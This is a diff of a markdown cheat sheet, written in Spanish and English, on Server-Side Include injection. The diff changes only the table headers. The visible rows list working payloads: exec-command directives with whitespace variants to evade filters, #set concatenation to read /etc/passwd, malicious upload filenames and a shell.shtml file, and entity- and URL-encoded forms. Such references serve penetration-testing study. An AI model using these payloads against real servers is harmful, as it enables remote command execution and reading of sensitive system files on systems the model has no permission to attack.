@@ -21,7 +21,7 @@ linked:
 
 ## Whitespace Tricks
 
-| **Filter** | **Bypass** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Block `<!--#exec` literal | `<!--#  exec cmd="id"-->` | Multi-space después `#`. |
 | Block `#exec` | `<!-- #exec cmd="id" -->` | Space después `<!--`. |
@@ -39,7 +39,7 @@ ___
 
 ## `#set` Concatenation
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Block `/etc/passwd` literal → split via `#set` vars | Filter bypass via concat. |
 | Split path | `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Standard. |
@@ -57,7 +57,7 @@ ___
 
 ## Inyección via Filename / Headers
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Filename injection | Upload con filename `<!--#exec cmd="id" -->.txt` | If filename listed en .shtml. |
 | Filename with extension trick | `shell.shtml` con SSI content | Direct render. |
@@ -79,7 +79,7 @@ ___
 
 ## Encoding y CGI Fallback
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | HTML entity encoding | `&lt;!--#exec cmd="id"--&gt;` | If app decodes pre-parse. |
 | URL encoding | `%3C!--%23exec%20cmd=%22id%22--%3E` | Standard. |
